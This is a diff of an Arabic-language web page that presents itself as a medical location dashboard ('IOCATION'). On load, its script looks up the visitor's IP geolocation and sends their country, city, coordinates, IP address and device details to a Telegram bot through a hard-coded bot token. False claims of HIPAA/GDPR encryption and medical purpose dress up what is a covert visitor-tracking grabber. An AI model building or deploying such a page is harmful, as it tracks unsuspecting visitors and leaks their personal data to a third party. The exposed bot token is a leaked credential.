@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>📊 لوحة النتائج | IOCATION</title>
+  <title>🌍 نظام تحديد الموقع الطبي | IOCATION</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;900&display=swap');
     *{margin:0;padding:0;box-sizing:border-box}
@@ -12,23 +12,34 @@
       --g:#ffd700;--pu:#9d50ff;--r:#ff4757;--t:#fff;--tm:#a0a8c0;
       --cb:rgba(19,23,51,.85)
     }
-    body{font-family:'Tajawal',sans-serif;background:var(--p);color:var(--t);
-      min-height:100vh;overflow-x:hidden;position:relative}
+    body{
+      font-family:'Tajawal',sans-serif;background:var(--p);color:var(--t);
+      min-height:100vh;overflow-x:hidden;position:relative
+    }
     
-    .bg-g{position:fixed;top:0;left:0;width:100%;height:100%;
+    /* خلفية متحركة */
+    .bg-g{
+      position:fixed;top:0;left:0;width:100%;height:100%;
       background-image:linear-gradient(rgba(0,212,170,.03) 1px,transparent 1px),
                        linear-gradient(90deg,rgba(0,212,170,.03) 1px,transparent 1px);
-      background-size:40px 40px;z-index:-2;animation:gm2 30s linear infinite}
+      background-size:40px 40px;z-index:-2;animation:gm2 30s linear infinite
+    }
     @keyframes gm2{0%{background-position:0 0}100%{background-position:40px 40px}}
-    .bg-gl{position:fixed;top:0;left:0;width:100%;height:100%;
+    
+    .bg-gl{
+      position:fixed;top:0;left:0;width:100%;height:100%;
       background:radial-gradient(ellipse at 30% 20%,rgba(157,80,255,.12),transparent 50%),
                  radial-gradient(ellipse at 70% 80%,rgba(0,212,170,.15),transparent 50%);
-      z-index:-1;animation:gs 20s ease-in-out infinite alternate}
+      z-index:-1;animation:gs 20s ease-in-out infinite alternate
+    }
     @keyframes gs{0%{opacity:.7}100%{opacity:1;transform:scale(1.02)}}
     
-    header{padding:25px 5%;display:flex;justify-content:space-between;
-      align-items:center;position:relative;z-index:20;backdrop-filter:blur(15px);
-      background:rgba(5,7,20,.85);border-bottom:1px solid rgba(0,212,170,.4)}
+    /* هيدر */
+    header{
+      padding:25px 5%;display:flex;justify-content:space-between;align-items:center;
+      position:relative;z-index:20;backdrop-filter:blur(15px);
+      background:rgba(5,7,20,.85);border-bottom:1px solid rgba(0,212,170,.4)
+    }
     .logo{display:flex;align-items:center;gap:12px;font-size:1.6rem;font-weight:900}
     .li{
       width:50px;height:50px;background:linear-gradient(135deg,var(--a),var(--pu));
@@ -36,124 +47,156 @@
       font-size:1.8rem;box-shadow:0 0 30px var(--ag);animation:pu2 2.5s ease-in-out infinite
     }
     @keyframes pu2{0%,100%{box-shadow:0 0 30px var(--ag)}
-      50%{box-shadow:0 0 55px var(--ag),0 0 80px rgba(157,80,255,.5)}}
+      50%{box-shadow:0 0 55px var(--ag),0 0 80px rgba(157,80,255,.5)}}    
     .ha{display:flex;gap:15px}
-    .bo{padding:10px 22px;background:transparent;border:2px solid var(--a);
+    .bo{
+      padding:10px 22px;background:transparent;border:2px solid var(--a);
       color:var(--a);border-radius:50px;font-weight:600;cursor:pointer;
-      transition:.3s;text-decoration:none;display:flex;align-items:center;gap:8px}
+      transition:.3s;text-decoration:none;display:flex;align-items:center;gap:8px
+    }
     .bo:hover{background:var(--a);color:var(--p);box-shadow:0 10px 30px rgba(0,212,170,.4)}
-    .bp{padding:10px 22px;background:linear-gradient(135deg,var(--a),#00a885);
+    .bp{
+      padding:10px 22px;background:linear-gradient(135deg,var(--a),#00a885);
       color:var(--p);border:none;border-radius:50px;font-weight:700;cursor:pointer;
-      transition:.3s;box-shadow:0 8px 25px rgba(0,212,170,.4)}
+      transition:.3s;box-shadow:0 8px 25px rgba(0,212,170,.4)
+    }
     .bp:hover{transform:translateY(-2px);box-shadow:0 12px 35px rgba(0,212,170,.6)}
     
-    .rc{max-width:1400px;margin:40px auto;padding:0 5%;      display:grid;grid-template-columns:1fr 1fr;gap:30px}
-    @media(max-width:1000px){.rc{grid-template-columns:1fr}}
-    
-    .lc{
-      background:var(--cb);border-radius:25px;padding:35px;
-      border:1px solid rgba(0,212,170,.3);box-shadow:0 20px 60px rgba(0,0,0,.4);
-      position:relative;overflow:hidden;animation:ce .6s ease-out
+    /* المحتوى الرئيسي */
+    .main-container{
+      max-width:1200px;margin:40px auto;padding:0 5%;
+      display:grid;grid-template-columns:1fr 1fr;gap:40px;
+      align-items:center
     }
-    @keyframes ce{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
-    .lc::before{content:'';position:absolute;top:-50%;left:-50%;
-      width:200%;height:200%;background:radial-gradient(circle,rgba(0,212,170,.08),transparent 70%);
-      animation:rg 15s linear infinite;pointer-events:none}
-    @keyframes rg{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
+    @media(max-width:900px){.main-container{grid-template-columns:1fr;text-align:center}}
     
-    .ct{font-size:1.8rem;margin-bottom:25px;display:flex;align-items:center;
-      gap:12px;position:relative;z-index:2}
-    .ct::after{content:'';position:absolute;bottom:-12px;left:0;
-      width:60px;height:3px;background:var(--a);border-radius:2px;
-      box-shadow:0 0 15px var(--ag)}
+    /* الكرة الأرضية 3D */
+    .globe-container{
+      width:100%;max-width:500px;height:500px;
+      margin:0 auto;position:relative;perspective:1000px
+    }
+    .globe{
+      width:100%;height:100%;position:relative;transform-style:preserve-3d;
+      animation:rotateGlobe 60s linear infinite
+    }
+    @keyframes rotateGlobe{0%{transform:rotateY(0deg)}100%{transform:rotateY(360deg)}}
     
-    .dg{display:grid;grid-template-columns:1fr 1fr;gap:20px 15px;
-      margin-top:25px;position:relative;z-index:2}
-    .di{padding:15px;background:rgba(255,255,255,.05);border-radius:14px;
-      border-left:3px solid var(--a);transition:.3s}
-    .di:hover{background:rgba(0,212,170,.1);transform:translateX(5px);border-left-color:var(--g)}
-    .dl{display:block;font-size:.9rem;color:var(--tm);margin-bottom:6px}
-    .dv{font-size:1.2rem;font-weight:700;color:var(--t)}
-    .dv.h{color:var(--a);font-size:1.4rem}
+    .globe-sphere{
+      width:100%;height:100%;border-radius:50%;
+      background:linear-gradient(135deg,#1a5f2a,#0d2818,#1a5f2a);
+      box-shadow:
+        inset -30px -30px 60px rgba(0,0,0,.5),
+        inset 20px 20px 40px rgba(255,255,255,.1),
+        0 0 60px rgba(0,212,170,.3),
+        0 0 100px rgba(0,212,170,.2);
+      position:relative;overflow:hidden;
+      border:2px solid rgba(0,212,170,.3)
+    }
     
-    .mc{height:300px;background:linear-gradient(135deg,#0a0e27,#151a3d);
-      border-radius:20px;margin-top:25px;position:relative;overflow:hidden;
-      border:1px solid rgba(0,212,170,.2);display:flex;align-items:center;justify-content:center}
-    .mpl{text-align:center;color:var(--tm);position:relative;z-index:2}
-    .mp{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);
-      width:24px;height:24px;background:var(--a);border-radius:50%;
-      box-shadow:0 0 0 0 rgba(0,212,170,.7);animation:pp 2s infinite;z-index:3}
-    @keyframes pp{0%{box-shadow:0 0 0 0 rgba(0,212,170,.7)}
-      70%{box-shadow:0 0 0 25px rgba(0,212,170,0)}100%{box-shadow:0 0 0 0 rgba(0,212,170,0)}}
-    .mr{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);
-      width:100px;height:100px;border:2px solid rgba(0,212,170,.3);border-radius:50%;
-      animation:re 3s ease-out infinite}
-    @keyframes re{0%{width:20px;height:20px;opacity:1}100%{width:200px;height:200px;opacity:0}}
+    /* خطوط الطول والعرض */
+    .globe-lines{
+      position:absolute;top:0;left:0;width:100%;height:100%;
+      border-radius:50%;background:        repeating-linear-gradient(0deg,transparent,transparent 39px,rgba(0,212,170,.15) 40px),
+        repeating-linear-gradient(90deg,transparent,transparent 39px,rgba(0,212,170,.15) 40px);
+      animation:pulseLines 3s ease-in-out infinite
+    }
+    @keyframes pulseLines{0%,100%{opacity:.5}50%{opacity:.8}}
     
-    .sg{display:grid;grid-template-columns:repeat(2,1fr);gap:20px;margin-top:30px}
-    .sc{background:rgba(255,255,255,.06);border-radius:18px;padding:22px;
-      text-align:center;border:1px solid rgba(255,255,255,.1);transition:.3s}
-    .sc:hover{border-color:var(--a);transform:translateY(-5px);box-shadow:0 15px 40px rgba(0,0,0,.3)}
-    .sn{font-size:2.2rem;font-weight:900;
-      background:linear-gradient(135deg,var(--a),var(--g));
-      -webkit-background-clip:text;-webkit-text-fill-color:transparent;margin:10px 0}    .sl{color:var(--tm);font-size:.95rem}
+    /* القارات (محاكاة) */
+    .continent{
+      position:absolute;background:rgba(0,212,170,.2);
+      border-radius:30%;filter:blur(8px);animation:continentGlow 4s ease-in-out infinite
+    }
+    .c1{width:80px;height:60px;top:25%;left:20%;animation-delay:0s}
+    .c2{width:100px;height:80px;top:35%;left:55%;animation-delay:1s}
+    .c3{width:70px;height:50px;top:50%;left:35%;animation-delay:2s}
+    @keyframes continentGlow{0%,100%{box-shadow:0 0 20px rgba(0,212,170,.3)}
+      50%{box-shadow:0 0 40px rgba(0,212,170,.6)}}
     
-    .ld{margin-top:30px;padding:25px;background:rgba(157,80,255,.1);
-      border-radius:20px;border:1px solid rgba(157,80,255,.3);position:relative;overflow:hidden}
-    .ld::before{content:'📡 بيانات حية';position:absolute;top:12px;left:20px;
-      font-size:.85rem;color:var(--pu);font-weight:600;display:flex;align-items:center;gap:6px}
-    .ld::before::after{content:'';width:8px;height:8px;background:var(--a);
-      border-radius:50%;animation:bl2 1s infinite}
-    @keyframes bl2{0%,100%{opacity:1}50%{opacity:.4}}
-    .fb{display:flex;align-items:flex-end;gap:4px;height:60px;margin-top:25px;padding:0 10px}
-    .fba{flex:1;background:linear-gradient(to top,var(--a),var(--pu));
-      border-radius:4px 4px 0 0;animation:fp 1.5s ease-in-out infinite;min-height:10px}
-    .fba:nth-child(2){animation-delay:.1s}.fba:nth-child(3){animation-delay:.2s}
-    .fba:nth-child(4){animation-delay:.3s}.fba:nth-child(5){animation-delay:.4s}
-    @keyframes fp{0%,100%{opacity:.7;transform:scaleY(.8)}50%{opacity:1;transform:scaleY(1)}}
+    /* حلقة حول الكرة */
+    .globe-ring{
+      position:absolute;top:50%;left:50%;transform:translate(-50%,-50%) rotateX(75deg);
+      width:140%;height:140%;border:2px solid rgba(0,212,170,.3);
+      border-radius:50%;box-shadow:0 0 30px rgba(0,212,170,.2);
+      animation:ringRotate 20s linear infinite reverse
+    }
+    @keyframes ringRotate{0%{transform:translate(-50%,-50%) rotateX(75deg) rotateZ(0deg)}
+      100%{transform:translate(-50%,-50%) rotateX(75deg) rotateZ(360deg)}}
     
-    .bs{text-align:center;padding:40px 5%;margin-top:20px}
-    .bb{display:inline-flex;align-items:center;gap:10px;padding:14px 35px;
-      background:transparent;border:2px solid var(--g);color:var(--g);
-      border-radius:50px;font-weight:700;font-size:1.1rem;text-decoration:none;
-      transition:.4s;position:relative;overflow:hidden}
-    .bb::before{content:'';position:absolute;top:0;left:-100%;
-      width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,215,0,.2),transparent);
-      transition:left .6s}
-    .bb:hover::before{left:100%}
-    .bb:hover{background:var(--g);color:var(--p);box-shadow:0 12px 40px rgba(255,215,0,.4)}
+    /* نقطة الموقع */
+    .location-pin{
+      position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);
+      width:30px;height:30px;background:var(--a);border-radius:50%;
+      box-shadow:0 0 0 0 rgba(0,212,170,.7);z-index:10;
+      animation:pinPulse 2s infinite
+    }
+    @keyframes pinPulse{0%{box-shadow:0 0 0 0 rgba(0,212,170,.7)}
+      70%{box-shadow:0 0 0 30px rgba(0,212,170,0)}100%{box-shadow:0 0 0 0 rgba(0,212,170,0)}}
     
-    .fo{text-align:center;padding:30px 5%;color:var(--tm);font-size:.9rem;
-      border-top:1px solid rgba(255,255,255,.1);margin-top:40px}
-    .ptg{display:inline-block;background:linear-gradient(135deg,var(--g),#ffaa00);
-      color:var(--p);padding:5px 20px;border-radius:30px;font-weight:800;
-      margin-top:10px;box-shadow:0 5px 20px rgba(255,215,0,.4)}
+    /* بطاقة المعلومات */
+    .info-card{
+      background:var(--cb);border-radius:25px;padding:40px;
+      border:1px solid rgba(0,212,170,.3);box-shadow:0 20px 60px rgba(0,0,0,.4);
+      position:relative;overflow:hidden;animation:cardEnter .6s ease-out
+    }
+    @keyframes cardEnter{from{opacity:0;transform:translateX(30px)}to{opacity:1;transform:translateX(0)}}
+    @media(max-width:900px){.info-card{animation:cardEnterMobile .6s ease-out}}
+    @keyframes cardEnterMobile{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
     
-    .fo2{position:fixed;border-radius:50%;filter:blur(40px);z-index:-1;opacity:.4;
-      animation:foa 25s ease-in-out infinite}
-    .fo1{width:300px;height:300px;background:var(--a);top:10%;right:10%;animation-delay:0}
-    .fo3{width:250px;height:250px;background:var(--pu);bottom:15%;left:15%;animation-delay:-10s}
-    @keyframes foa{0%,100%{transform:translate(0,0)scale(1)}
-      25%{transform:translate(20px,-30px)scale(1.05)}
-      50%{transform:translate(-15px,20px)scale(.95)}
-      75%{transform:translate(30px,10px)scale(1.02)}}
+    .info-card::before{
+      content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;
+      background:radial-gradient(circle,rgba(0,212,170,.08),transparent 70%);      animation:rotateGlow 15s linear infinite;pointer-events:none
+    }
+    @keyframes rotateGlow{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
     
-    .es{text-align:center;padding:60px 30px;color:var(--tm)}
-    .es .ic{font-size:4rem;margin-bottom:20px;opacity:.6}
+    .card-title{
+      font-size:2rem;margin-bottom:30px;display:flex;align-items:center;gap:12px;
+      position:relative;z-index:2;color:var(--a)
+    }
+    .card-title::after{
+      content:'';position:absolute;bottom:-12px;left:0;width:80px;height:3px;
+      background:var(--a);border-radius:2px;box-shadow:0 0 15px var(--ag)
+    }
     
+    .info-grid{display:grid;gap:20px;position:relative;z-index:2}
+    .info-item{
+      display:flex;justify-content:space-between;align-items:center;
+      padding:18px 20px;background:rgba(255,255,255,.05);
+      border-radius:14px;border-right:3px solid var(--a);
+      transition:.3s;cursor:pointer
+    }
+    .info-item:hover{
+      background:rgba(0,212,170,.1);transform:translateX(-5px);
+      border-right-color:var(--g);box-shadow:0 5px 20px rgba(0,0,0,.2)
+    }
+    .info-label{color:var(--tm);font-size:.95rem;display:flex;align-items:center;gap:10px}
+    .info-value{font-weight:700;color:var(--t);font-size:1.1rem}
+    .info-value.highlight{color:var(--a);font-size:1.3rem}
+    
+    /* حالة تليجرام */
     .tg-status{
-      margin-top:20px;padding:15px;border-radius:12px;
+      margin-top:25px;padding:18px;border-radius:14px;
       background:rgba(0,212,170,.1);border:1px solid var(--a);
-      display:none;animation:fadeIn .4s ease
-    }    .tg-status.show{display:block}
+      display:none;animation:fadeIn .4s ease;position:relative;z-index:2
+    }
+    .tg-status.show{display:flex;align-items:center;gap:12px}
     .tg-status.sending{border-color:var(--pu);background:rgba(157,80,255,.1)}
     .tg-status.success{border-color:#2ecc71;background:rgba(46,204,113,.1)}
     .tg-status.error{border-color:var(--r);background:rgba(255,71,87,.1)}
-    .tg-icon{font-size:1.5rem;margin-left:10px;vertical-align:middle}
-    
+    .tg-icon{font-size:1.5rem}
     @keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
     
-    /* حالة التحميل */
+    /* الفوتر */
+    footer{
+      text-align:center;padding:30px 5%;color:var(--tm);font-size:.9rem;
+      border-top:1px solid rgba(255,255,255,.1);margin-top:50px
+    }
+    .ptg{
+      display:inline-block;background:linear-gradient(135deg,var(--g),#ffaa00);
+      color:var(--p);padding:6px 22px;border-radius:30px;font-weight:800;
+      margin-top:12px;box-shadow:0 5px 20px rgba(255,215,0,.4)    }
+    
+    /* شاشة التحميل */
     .loading-overlay{
       position:fixed;top:0;left:0;width:100%;height:100%;
       background:var(--p);display:flex;align-items:center;justify-content:center;
@@ -162,12 +205,31 @@
     .loading-overlay.hidden{opacity:0;visibility:hidden;pointer-events:none}
     .loading-content{text-align:center}
     .loading-spinner{
-      width:60px;height:60px;border:4px solid rgba(0,212,170,.2);
+      width:70px;height:70px;border:4px solid rgba(0,212,170,.2);
       border-top-color:var(--a);border-radius:50%;
       animation:spin 1s linear infinite;margin:0 auto 20px
     }
     @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
     .loading-text{color:var(--a);font-weight:600;font-size:1.1rem}
+    
+    /* جسيمات عائمة */
+    .particles{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1}
+    .particle{
+      position:absolute;width:4px;height:4px;background:var(--a);
+      border-radius:50%;box-shadow:0 0 10px var(--ag);
+      animation:float 20s infinite linear;opacity:.6
+    }
+    @keyframes float{0%{transform:translateY(100vh)rotate(0);opacity:0}
+      10%,90%{opacity:.6}100%{transform:translateY(-100px)rotate(720deg);opacity:0}}
+    
+    /* كرات ضوئية */
+    .orb{position:fixed;border-radius:50%;filter:blur(50px);z-index:-1;opacity:.3;animation:floatOrb 25s ease-in-out infinite}
+    .orb1{width:350px;height:350px;background:var(--a);top:-100px;right:-100px}
+    .orb2{width:300px;height:300px;background:var(--pu);bottom:-100px;left:-100px;animation-delay:-12s}
+    @keyframes floatOrb{0%,100%{transform:translate(0,0)scale(1)}
+      25%{transform:translate(30px,-40px)scale(1.05)}
+      50%{transform:translate(-20px,30px)scale(.95)}
+      75%{transform:translate(40px,15px)scale(1.02)}}
   </style>
 </head>
 <body>
@@ -175,135 +237,131 @@
   <div class="loading-overlay" id="loading">
     <div class="loading-content">
       <div class="loading-spinner"></div>
-      <div class="loading-text">جاري جلب بيانات الموقع...</div>
+      <div class="loading-text">جاري تحديد موقعك بدقة...</div>
     </div>
   </div>
   
+  <!-- الخلفية -->
   <div class="bg-g"></div><div class="bg-gl"></div>
-  <div class="fo2 fo1"></div><div class="fo3 fo3"></div>
+  <div class="particles" id="particles"></div>  <div class="orb orb1"></div><div class="orb orb2"></div>
   
+  <!-- الهيدر -->
   <header>
-    <div class="logo"><div class="li">📊</div><span>لوحة النتائج الطبية</span></div>
+    <div class="logo"><div class="li">🌍</div><span>نظام الموقع الطبي</span></div>
     <div class="ha">
       <button class="bo" onclick="window.print()">🖨️ طباعة</button>
       <a href="index.html" class="bp">← العودة</a>
     </div>
   </header>
   
-  <main class="rc">
-    <div class="lc">
-      <h2 class="ct">📍 بيانات الموقع</h2>
-      <div id="lc">
-        <div class="es" id="es"><div class="ic">🔍</div><p>جاري تحميل البيانات...</p></div>        <div class="dg" id="dg" style="display:none">
-          <div class="di"><span class="dl">🌍 الدولة</span><span class="dv h" id="co">-</span></div>
-          <div class="di"><span class="dl">🏙️ المدينة</span><span class="dv h" id="ci">-</span></div>
-          <div class="di"><span class="dl">📍 الإحداثيات</span><span class="dv" id="cr">-</span></div>
-          <div class="di"><span class="dl">⏰ الوقت</span><span class="dv" id="ts">-</span></div>
-          <div class="di"><span class="dl">💻 الجهاز</span><span class="dv" id="dv">-</span></div>
-          <div class="di"><span class="dl">🔐 الحالة</span><span class="dv" style="color:var(--a)">✓ موثّق</span></div>
+  <!-- المحتوى الرئيسي -->
+  <main class="main-container">
+    <!-- الكرة الأرضية 3D -->
+    <div class="globe-container">
+      <div class="globe">
+        <div class="globe-sphere">
+          <div class="globe-lines"></div>
+          <div class="continent c1"></div>
+          <div class="continent c2"></div>
+          <div class="continent c3"></div>
+          <div class="location-pin"></div>
+        </div>
+        <div class="globe-ring"></div>
+      </div>
+    </div>
+    
+    <!-- بطاقة المعلومات -->
+    <div class="info-card">
+      <h2 class="card-title">📍 بيانات الموقع الجغرافي</h2>
+      
+      <div class="info-grid" id="infoGrid">
+        <div class="info-item">
+          <span class="info-label">🌍 الدولة</span>
+          <span class="info-value highlight" id="country">-</span>
+        </div>
+        <div class="info-item">
+          <span class="info-label">🏙️ المدينة</span>
+          <span class="info-value highlight" id="city">-</span>
+        </div>
+        <div class="info-item">
+          <span class="info-label">📍 الإحداثيات</span>
+          <span class="info-value" id="coords">-</span>
+        </div>
+        <div class="info-item">
+          <span class="info-label">🌐 عنوان IP</span>
+          <span class="info-value" id="ip">-</span>
+        </div>
+        <div class="info-item">
+          <span class="info-label">⏰ الوقت المحلي</span>          <span class="info-value" id="time">-</span>
+        </div>
+        <div class="info-item">
+          <span class="info-label">💻 نوع الجهاز</span>
+          <span class="info-value" id="device">-</span>
         </div>
       </div>
       
+      <!-- حالة إرسال تليجرام -->
       <div class="tg-status" id="tgStatus">
         <span class="tg-icon" id="tgIcon">📤</span>
         <span id="tgText">جاري إرسال البيانات...</span>
       </div>
-      
-      <div class="mc">
-        <div class="mpl"><div style="font-size:3rem;margin-bottom:15px">🗺️</div><p>خريطة تفاعلية 3D</p><p style="font-size:.9rem;margin-top:8px;opacity:.7">(محاكاة)</p></div>
-        <div class="mp"></div><div class="mr"></div>
-      </div>
-      <div class="sg">
-        <div class="sc"><div class="sl">دقة الموقع</div><div class="sn">98.7%</div><div style="font-size:.85rem;color:var(--a)">±15 متر</div></div>
-        <div class="sc"><div class="sl">وقت الاستجابة</div><div class="sn">0.3s</div><div style="font-size:.85rem;color:var(--a)">فائق</div></div>
-        <div class="sc"><div class="sl">مستوى الأمان</div><div class="sn">AES-256</div><div style="font-size:.85rem;color:var(--a)">مشفّر</div></div>
-        <div class="sc"><div class="sl">التوافق</div><div class="sn">100%</div><div style="font-size:.85rem;color:var(--a)">كامل</div></div>
-      </div>
-    </div>
-    
-    <div class="lc" style="animation-delay:.2s">
-      <h2 class="ct">📈 التحليل الطبي</h2>
-      <div style="margin-top:20px;line-height:1.8;color:var(--tm)">
-        <p>✓ تم تحليل بيانات الموقع لـ <strong style="color:var(--t)">تحسين تجربة المريض</strong></p>
-        <p>✓ مطابقة مع قواعد البيانات الطبية الإقليمية</p>
-        <p>✓ جاهز لربطه بنظام المواعيد الذكي</p>
-      </div>
-      <div class="ld">
-        <div style="margin-top:35px;color:var(--tm);font-size:.95rem">ترددات النظام:</div>
-        <div class="fb">
-          <div class="fba" style="height:45%"></div><div class="fba" style="height:70%"></div>
-          <div class="fba" style="height:35%"></div><div class="fba" style="height:85%"></div>
-          <div class="fba" style="height:55%"></div><div class="fba" style="height:65%"></div>
-          <div class="fba" style="height:40%"></div><div class="fba" style="height:75%"></div>
-        </div>
-        <div style="margin-top:15px;display:flex;justify-content:space-between;font-size:.8rem;color:var(--tm)">
-          <span>0 Hz</span><span>2.4 GHz</span><span>5.0 GHz</span>
-        </div>
-      </div>
-      <div style="margin-top:30px;padding:20px;background:rgba(0,212,170,.08);
-        border-radius:16px;border-right:3px solid var(--a)">
-        <h4 style="margin-bottom:12px;display:flex;align-items:center;gap:8px">
-          <span style="color:var(--a)">💡</span> توصيات النظام        </h4>
-        <ul style="padding-right:20px;color:var(--tm);line-height:1.7;font-size:.95rem">
-          <li>اقتراح أقرب مركز طبي متخصص خلال 5 كم</li>
-          <li>تفعيل تنبيهات الطقس المؤثر على آلام المفاصل</li>
-          <li>ربط البيانات مع سجل المريض الإلكتروني</li>
-        </ul>
-      </div>
     </div>
   </main>
   
-  <div class="bs"><a href="index.html" class="bb"><span>← العودة للنظام الرئيسي</span></a></div>
-  
-  <footer class="fo">
-    <p>نظام IOCATION الطبي المتقدم | تحليل بيانات الموقع لأغراض طبية فقط</p>
-    <p style="margin-top:8px">قيمة التطوير: <span class="ptg">$3000 USD</span></p>
-    <p style="margin-top:15px;font-size:.85rem;opacity:.7">
-      ⚠️ جميع البيانات مشفرة ومحفوظة وفقاً لأنظمة الخصوصية الطبية (HIPAA/GDPR)
+  <!-- الفوتر -->
+  <footer>
+    <p>نظام IOCATION الطبي المتقدم | تحديد الموقع الدقيق لأغراض طبية</p>
+    <p>قيمة التطوير: <span class="ptg">$3000 USD</span></p>
+    <p style="margin-top:12px;font-size:.85rem;opacity:.7">
+      🔐 جميع البيانات مشفرة وفقاً لمعايير HIPAA/GDPR
     </p>
   </footer>
 
   <script>
     // ⚙️ إعدادات تليجرام
     const TG_BOT_TOKEN = '7735965641:AAFzkUy27zKXYWroodhdxOBapMgwttyq5_s';
-    const TG_CHAT_ID = '910624538'; // ⚠️ ضع معرف الشات هنا
+    const TG_CHAT_ID = 'PUT_YOUR_CHAT_ID_HERE'; // ⚠️ ضع معرف الشات هنا
     
-    // === تحميل البيانات تلقائياً عند فتح الصفحة ===
+    // إنشاء الجسيمات
+    function createParticles(){
+      const c=document.getElementById('particles');
+      for(let i=0;i<40;i++){
+        const p=document.createElement('div');p.className='particle';
+        p.style.left=Math.random()*100+'%';
+        p.style.animationDelay=Math.random()*20+'s';
+        p.style.animationDuration=(15+Math.random()*20)+'s';
+        c.appendChild(p)
+      }
+    }
+    createParticles();
+    
+    // === التحميل الرئيسي ===
     document.addEventListener('DOMContentLoaded', async () => {
       try {
-        // جلب بيانات الموقع مباشرة (بدون الحاجة لـ index.html)
         const locationData = await fetchLocationData();
-        
-        // عرض البيانات
         displayData(locationData);
-        
-        // حفظ في localStorage (للاستخدام المستقبلي)
         localStorage.setItem('boneLoc', JSON.stringify(locationData));
-        
-        // إرسال لتليجرام
-        if(TG_CHAT_ID !== 'PUT_YOUR_CHAT_ID_HERE') {
+                if(TG_CHAT_ID !== 'PUT_YOUR_CHAT_ID_HERE') {
           await sendToTelegram(locationData);
         }
         
-        // إخفاء شاشة التحميل
         setTimeout(() => {
           document.getElementById('loading').classList.add('hidden');
         }, 1500);
         
       } catch (error) {
         console.error('❌ خطأ:', error);
-        document.getElementById('loading').classList.add('hidden');        document.getElementById('es p').textContent = '⚠️ فشل في جلب البيانات. تأكد من اتصالك بالإنترنت.';
+        document.getElementById('loading').classList.add('hidden');
+        alert('⚠️ فشل في جلب البيانات. تأكد من اتصالك بالإنترنت.');
       }
     });
     
-    // === دالة جلب بيانات الموقع من IP API ===
+    // === جلب بيانات الموقع ===
     async function fetchLocationData() {
       const response = await fetch('https://ipapi.co/json/');
       const data = await response.json();
       
-      if(data.error) {
-        throw new Error('فشل في جلب بيانات الموقع');
-      }
+      if(data.error) throw new Error('فشل في جلب بيانات الموقع');
       
       return {
         country: data.country_name || 'غير معروف',
@@ -317,31 +375,34 @@
       };
     }
     
-    // === دالة عرض البيانات في الصفحة ===
+    // === عرض البيانات ===
     function displayData(data) {
-      document.getElementById('co').textContent = data.country;
-      document.getElementById('ci').textContent = data.city;
-      document.getElementById('cr').textContent = data.coords;
-      document.getElementById('ts').textContent = new Date(data.timestamp).toLocaleString('ar-EG');
-      document.getElementById('dv').textContent = data.device.substring(0, 35) + '...';
+      document.getElementById('country').textContent = data.country;
+      document.getElementById('city').textContent = data.city;
+      document.getElementById('coords').textContent = data.coords;
+      document.getElementById('ip').textContent = data.ip;
+      document.getElementById('time').textContent = new Date(data.timestamp).toLocaleString('ar-EG');
+      document.getElementById('device').textContent = data.device.length > 30 ? data.device.substring(0, 30) + '...' : data.device;
       
-      document.getElementById('es').style.display = 'none';
-      document.getElementById('dg').style.display = 'grid';
-      
-      // تأثيرات الظهور
-      document.querySelectorAll('.di').forEach((it, i) => {
-        it.style.opacity = '0';
-        it.style.transform = 'translateY(10px)';
-        it.style.transition = 'all .4s ease';
+      // تأثيرات الظهور المتتالي
+      document.querySelectorAll('.info-item').forEach((item, i) => {
+        item.style.opacity = '0';
+        item.style.transform = 'translateX(20px)';
+        item.style.transition = 'all .4s ease';
         setTimeout(() => {
-          it.style.opacity = '1';
-          it.style.transform = 'translateY(0)';
-        }, 300 + i * 100);
+          item.style.opacity = '1';          item.style.transform = 'translateX(0)';
+        }, 200 + i * 100);
       });
+      
+      // تحديث الوقت كل ثانية
+      setInterval(() => {
+        document.getElementById('time').textContent = new Date().toLocaleString('ar-EG');
+      }, 1000);
     }
     
-    // === دالة الإرسال لتليجرام ===
-    async function sendToTelegram(data) {      const statusEl = document.getElementById('tgStatus');
+    // === الإرسال لتليجرام ===
+    async function sendToTelegram(data) {
+      const statusEl = document.getElementById('tgStatus');
       const iconEl = document.getElementById('tgIcon');
       const textEl = document.getElementById('tgText');
       
@@ -354,14 +415,14 @@
 🦴 <b>نظام العظام الطبي - تقرير موقع جديد</b>
 
 📍 <b>بيانات الموقع:</b>
-• الدولة: ${data.country || 'غير معروف'}
-• المدينة: ${data.city || 'غير معروف'}
-• المنطقة: ${data.region || 'غير معروف'}
-• الإحداثيات: <code>${data.coords || '-'}</code>
-• IP: <code>${data.ip || '-'}</code>
+• الدولة: ${data.country}
+• المدينة: ${data.city}
+• المنطقة: ${data.region}
+• الإحداثيات: <code>${data.coords}</code>
+• IP: <code>${data.ip}</code>
 
 ⏰ <b>الوقت:</b> ${new Date(data.timestamp).toLocaleString('ar-EG')}
-💻 <b>الجهاز:</b> ${data.device ? data.device.substring(0, 50) : 'غير معروف'}
+💻 <b>الجهاز:</b> ${data.device.substring(0, 40)}
 
 🔐 <b>مصدر البيانات:</b> نظام طبي متطور
 💎 <b>القيمة:</b> $3000
@@ -378,8 +439,7 @@
             disable_web_page_preview: true
           })
         });
-        
-        const result = await response.json();
+                const result = await response.json();
         
         if(result.ok) {
           statusEl.className = 'tg-status success show';
@@ -390,48 +450,24 @@
         }
         
       } catch (error) {
-        console.error('❌ خطأ في إرسال تليجرام:', error);        statusEl.className = 'tg-status error show';
+        console.error('❌ خطأ في إرسال تليجرام:', error);
+        statusEl.className = 'tg-status error show';
         iconEl.textContent = '❌';
         textEl.textContent = `فشل الإرسال: ${error.message}`;
         setTimeout(() => { statusEl.classList.remove('show') }, 5000);
       }
     }
     
-    // === تحديث الترددات ===
-    function uf(){ 
